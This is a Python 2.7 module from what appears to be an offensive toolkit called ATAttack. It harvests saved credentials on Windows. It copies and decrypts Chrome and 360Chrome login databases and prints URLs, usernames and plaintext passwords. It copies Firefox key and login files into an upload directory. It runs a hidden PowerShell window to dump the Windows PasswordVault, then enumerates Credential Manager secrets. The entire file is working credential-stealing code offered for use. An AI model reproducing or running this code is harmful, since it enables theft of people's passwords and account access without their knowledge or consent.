#! /usr/bin/env python2.7
# -*- coding: utf-8 -*-

import sqlite3
import win32crypt
import configparser
import shutil
import re
import win32cred
import random,string
import os
from ATAttack.framework.constant import constant
import subprocess
import _subprocess as sub
import tempfile

tmp = tempfile.gettempdir()


class decypt():

    def __init__(self):
        self.database_query = 'SELECT action_url, username_value, password_value FROM logins'

    def str_rangdom(self):
        return ''.join(random.sample(string.ascii_letters + string.digits,8))

    def copy_db(self,db_path,database_path):
        try:
            if os.path.isfile(db_path):
                shutil.copy(db_path, database_path)
            return database_path
        except Exception:
            pass

    def clean_file(self, db_path):
        try:
            os.popen('RD /S /Q ' + db_path)
        except Exception:
            return False

    def get_decypt_chrome(self):

        db_path = os.path.join(
            constant.profile['LOCALAPPDATA'],u'Google\Chrome\\User Data\Default\Login Data')
        databases = self.copy_db(db_path,tmp + os.sep + self.str_rangdom())
        conn = sqlite3.connect(databases)
        cursor = conn.cursor()
        cursor.execute(self.database_query)
        try:
            for url, login, password in cursor.fetchall():
                password = win32crypt.CryptUnprotectData(password, None, None, None, 0)
                if password:
                    print "Chrome browser decryption result: "
                    print 'Title: ' + url
                    print 'Username: ' + login
                    print 'Password: ' + password
        except Exception:
            return False
        finally:
            conn.close()
            os.remove(databases)

    def get_decypt_360chrome(self):
        file_path = os.path.join(
            constant.profile['LOCALAPPDATA'],r'360Chrome\Chrome\User Data\Default\Login Data')
        if os.path.exists(file_path):
            databases = self.copy_db(file_path,tmp + os.sep + self.str_rangdom())
            try:
                conn = sqlite3.connect(databases)
                cursor = conn.cursor()
                print '[*] Finding histroy in 360Chrome'
                cursor.execute(
                    'SELECT action_url, username_value, password_value FROM logins')
                for result in cursor.fetchall():
                    password = win32crypt.CryptUnprotectData(
                        result[2], None, None, None, 0)[1]
                    if password:
                        print "360 browser decryption result: "
                        print 'Title: ' + result[0]
                        print 'Username: ' + result[1]
                        print 'Password: ' + password
                conn.close()
                os.remove(databases)
            except Exception :
                pass

    def get_firefox_profiles(self):

        iniPath = os.path.join(constant.profile['APPDATA'],
                               r'Mozilla\Firefox\profiles.ini')
        config = configparser.ConfigParser()
        config.read(iniPath)
        return os.path.join(
            constant.profile['APPDATA'],r'Mozilla\Firefox',config['Profile0']['Path'] + '\\') .replace("/", "\\")

    def send_firefox_data(self):

        key = ['key4.db', 'key3.db', 'logins.json']
        for db in key:
            filename = self.get_firefox_profiles() + db
            if os.path.isfile(filename):
                shutil.copy(filename, constant.upload_dir)

    def ie_decrypt(self):


        try:
            cmdline = '''
                    try
                    {
                        #Load the WinRT projection for the PasswordVault
                        $Script:vaultType = [Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
                        $Script:vault	  = new-object Windows.Security.Credentials.PasswordVault -ErrorAction silentlycontinue
                    }
                    catch
                    {
                        throw "This module relies on functionality provided in Windows 8 or Windows 2012 and above."
                    }
                    #endregion
    
                    function Get-VaultCredential
                    {
                        process
                        {
                            try
                            {
                                &{
                                    $Script:vault.RetrieveAll()
                                } | foreach-Object {  $_.RetrievePassword() ; "Username......";$_.UserName;"######";"Password......";$_.Password;"######";"Website......";$_.Resource;"_________" }
                            }
                            catch
                            {
                                Write-Error -ErrorRecord $_ -RecommendedAction "Check your search input - user: $UserName resource: $Resource"
                            }
                        }
                        end
                        {
                            Write-Debug "[$cmdName] Exiting function"
                        }
                    }
                    Get-VaultCredential
                    '''

            command = ['powershell.exe', '/c', cmdline]

            info = subprocess.STARTUPINFO()
            info.dwFlags = sub.STARTF_USESHOWWINDOW | sub.CREATE_NEW_PROCESS_GROUP
            info.wShowWindow = sub.SW_HIDE
            p = subprocess.Popen(command, startupinfo=info, stderr=subprocess.STDOUT, stdout=subprocess.PIPE,
                                 universal_newlines=True)
            results, _ = p.communicate()
            passwords = []
            for result in results.replace('\n', '').split('_________'):
                values = {}
                if result:
                    for res in result.split('######'):
                        values[res.split('......')[0]] = res.split('......')[1]
                    passwords.append(values)
            print "Get common credentials for windows vault :" + "\n" + str(passwords)
            CRED_TYPE_GENERIC = win32cred.CRED_TYPE_GENERIC
            CredRead = win32cred.CredRead
            creds = win32cred.CredEnumerate(None, 0)  # Enumerate credentials
            credentials = []
            for package in creds:
                try:
                    target = package['TargetName']
                    creds = CredRead(target, CRED_TYPE_GENERIC)
                    credentials.append(creds)
                except Exception:
                    pass
            values_ = {}
            for cred in credentials:
                values_['service'] = cred['TargetName']
                values_['UserName'] = cred['UserName']
                values_['pwd'] = cred['CredentialBlob'].decode('utf16')
            print "Get windows vault web credentials :" + "\n" + str(values_)
        except Exception:
            pass
